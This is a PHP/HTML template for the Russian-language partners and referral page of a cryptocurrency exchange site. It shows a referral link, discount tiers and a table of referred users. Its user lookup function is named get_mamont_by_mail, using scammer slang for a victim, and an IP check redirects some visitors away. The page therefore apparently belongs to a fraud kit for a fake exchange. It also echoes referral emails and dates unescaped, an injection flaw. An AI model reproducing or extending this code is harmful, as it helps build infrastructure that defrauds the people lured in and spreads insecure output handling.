<!DOCTYPE html>
<html lang="ru">

<?php
include('../layout/ru/head.php');
include('../vender/logic.php');
$block = check_ip();
if ($block == false) {
    header('Location: ' . 'ru/error.php');
}
?>

<body>

    <div class="wrapper">
        <div class="preloader">
            <div class="preloader__loader"></div>
        </div>
        <?php
        session_start();
        if (isset($_SESSION['email'])) {
            include('../layout/ru/header_reg.php');
        } else {
            include('../layout/ru/header.php');
        }
        ?>
        <main class="main">
            <section class="partners">
                <div class="container partners__container">
                    <div class="partners__start wow animate__fadeInLeft" data-wow-delat=".25s">
                        <h1 class="title partners__title">
                            Партнёрам
                        </h1>
                        <h2 class="title partners__subtitle">
                            Реферальная ссылка
                        </h2>
                        <p class="partners__text">
                            Приглашайте своих друзей и знакомых пользоваться нашим сервисом обмена, и получайте бонусы в
                            виде скидок на комиссию при транзакциях на любые валютные пары!
                        </p>
                        <?php
                        if (isset($_SESSION['email'])) {
                            $user = get_mamont_by_mail($_SESSION['email']);
                            $partners = partners($user['key']);
                            echo '<div class="input__wrapper mt-20"><input class="input partners__input" type="text" value="' . $_SERVER['SERVER_NAME'] . '?ref=' . $user['key'] . '"readonly><a class="btn btn_background_blue partners__btn input__copy" href="#">Копировать</a></div>';
                        }
                        ?>
                        <div class="partners__discounts">
                            <div class="partners__discount">
                                <div class="step <? echo (count($partners) >= 1 ? (count($partners) < 3 ? 'step_active' : 'step_open') : '') ?> partners__discount-step">
                                    1
                                </div>
                                <div class="partners__discount-wrapper">
                                    <div class="partners__discount-title <? echo (count($partners) >= 1 ? (count($partners) < 3 ? '' : 'partners__discount-title_light') : 'partners__discount-title_light') ?>">
                                        Скидка 3%
                                    </div>
                                    <p class="partners__discount-text <? echo (count($partners) >= 1 ? (count($partners) < 3 ? '' : 'partners__discount-text_light') : 'partners__discount-text_light') ?>">
                                        Пригласите 1 пользователя
                                    </p>
                                </div>
                            </div>
                            <div class="partners__discount">
                                <div class="step <? echo (count($partners) >= 3 ? (count($partners) < 5 ? 'step_active' : 'step_open') : '') ?> partners__discount-step">
                                    2
                                </div>
                                <div class="partners__discount-wrapper">
                                    <div class="partners__discount-title <? echo (count($partners) >= 3 ? (count($partners) < 5 ? '' : 'partners__discount-title_light') : 'partners__discount-title_light') ?>">
                                        Скидка 5%
                                    </div>
                                    <p class="partners__discount-text <? echo (count($partners) >= 3 ? (count($partners) < 5 ? '' : 'partners__discount-text_light') : 'partners__discount-text_light') ?>">
                                        Пригласите 3 пользователя
                                    </p>
                                </div>
                            </div>
                            <div class="partners__discount">
                                <div class="step <? echo (count($partners) >= 5 ? 'step_active' : '') ?> partners__discount-step">
                                    3
                                </div>
                                <div class="partners__discount-wrapper">
                                    <div class="partners__discount-title <? echo (count($partners) < 5) ? 'partners__discount-title_light' : '' ?>">
                                        Скидка 10%
                                    </div>
                                    <p class="partners__discount-text <? echo (count($partners) < 5) ? 'partners__discount-text_light' : '' ?>">
                                        Пригласите 5 пользователя
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="partners__end wow animate__fadeInRight" data-wow-delat=".25s">
                        <div class="panel partners__panel">
                            <div class="panel__top">
                                <div class="panel__wrapper">
                                    <a class="panel__link panel__link_active" href="#" data-page="referrals">Ваши
                                        рефералы</a>
                                    <a class="panel__link" href="#" data-page="recent-referrals">Недавние</a>
                                </div>
                            </div>
                            <div class="panel__line"></div>
                            <div class="panel__bottom">
                                <div class="page page-referrals">
                                    <div class="partners__table-wrapper">
                                        <table class="partners__table">
                                            <?php
                                            if (isset($_SESSION['email'])) {
                                                if (count($partners) != 0) {
                                                    echo '<tr class="partners__tr">
                                                        <th class="partners__th">Реферал</th>
                                                        <th class="partners__th">Дата</th>
                                                        <th class="partners__th">Транзакций</th>
                                                    </tr>';

                                                    for ($i = 0; $i < count($partners); ++$i) {
                                                        echo '<tr class="partners__tr">
                                                        <td
                                                        class="partners__td partners__td_color_black partners__user partners__td-center">
                                                        <img class="partners__img" src="../img/icons/user.svg" alt="user">
                                                        ' . $partners[$i]['email'] . '
                                                        </td>
                                                        <td class="partners__td partners__td_color_gray">
                                                        ' . $partners[$i]['data'] . '
                                                        </td>
                                                        <td class="partners__td partners__td_color_blue">' . $partners[$i]['count'] . '</td>
                                                        </tr>';
                                                    }
                                                } else {
                                                    echo '<p class="panel__text text-center">
                                            К сожалению вы еще никого не пригласили.
                                        </p>';
                                                }
                                            }
                                            ?>
                                        </table>
                                    </div>
                                    <?php
                                    if (isset($_SESSION['email'])) {
                                    } else {
                                        echo '<div class="partners__btns">
                                            <a class="btn btn_background_light_blue wd-full text-center" href="auth.php?auth=signin">Войти</a>
                                            <a class="btn btn_background_blue wd-full text-center mt-10"
                                                href="auth.php?auth=signup">Регистрация</a>
                                        </div>';
                                    }
                                    ?>

                                </div>
                                <div class="page page-recent-referrals">
                                    <div class="partners__table-wrapper">
                                        <table class="partners__table">
                                            <?php
                                            if (isset($_SESSION['email'])) {
                                                if (count($partners) != 0) {

                                                    echo '<tr class="partners__tr">
                                                    <th class="partners__th">Реферал</th>
                                                    <th class="partners__th">Дата</th>
                                                    <th class="partners__th">Транзакций</th>
                                                </tr>';
                                                    foreach ($partners as $partner) {
                                                        echo '<tr class="partners__tr">
                                                    <td
                                                    class="partners__td partners__td_color_black partners__user partners__td-center">
                                                    <img class="partners__img" src="../img/icons/user.svg" alt="user">
                                                    ' . $partner['email'] . '
                                                    </td>
                                                    <td class="partners__td partners__td_color_gray">
                                                    ' . $partner['data'] . '
                                                    </td>
                                                    <td class="partners__td partners__td_color_blue">' . $partner['count'] . '</td>
                                                    </tr>';
                                                    }
                                                } else {
                                                    echo '<p class="panel__text text-center">
                                            К сожалению вы еще никого не пригласили.
                                        </p>';
                                                }
                                            }
                                            ?>
                                        </table>
                                    </div>
                                    <?php
                                    if (isset($_SESSION['email'])) {
                                    } else {
                                        echo '<div class="partners__btns">
                                        <a class="btn btn_background_light_blue wd-full text-center" href="auth.php?auth=signin">Войти</a>
                                        <a class="btn btn_background_blue wd-full text-center mt-10"
                                            href="auth.php?auth=signup">Регистрация</a>
                                    </div>';
                                    }
                                    ?>
                                </div>
                            </div>
                        </div>
                        <div class="shapes-tg partners__shapes-tg">
                            <img class="shapes-tg__img shapes-tg__img_2 partners__shapes-tg-img_2" src="../img/shapes-tg/2.png" alt="shape">
                            <img class="shapes-tg__img shapes-tg__img_3 partners__shapes-tg-img_3" src="../img/shapes-tg/3.png" alt="shape">
                            <img class="shapes-tg__img shapes-tg__img_4 partners__shapes-tg-img_4" src="../img/shapes-tg/4.png" alt="shape">
                            <img class="shapes-tg__img shapes-tg__img_5 partners__shapes-tg-img_5" src="../img/shapes-tg/5.png" alt="shape">
                            <img class="shapes-tg__img shapes-tg__img_6 partners__shapes-tg-img_6" src="../img/shapes-tg/4.png" alt="shape">
                            <img class="shapes-tg__img shapes-tg__img_7 partners__shapes-tg-img_7" src="../img/shapes-tg/6.png" alt="shape">
                        </div>
                    </div>
                </div>
            </section>
        </main>
    </div>

    <script src="../js/libs/jquery-3.6.1.min.js"></script>
    <script src="../js/libs/wow.min.js"></script>
    <script src="../js/script.js"></script>
</body>

</html>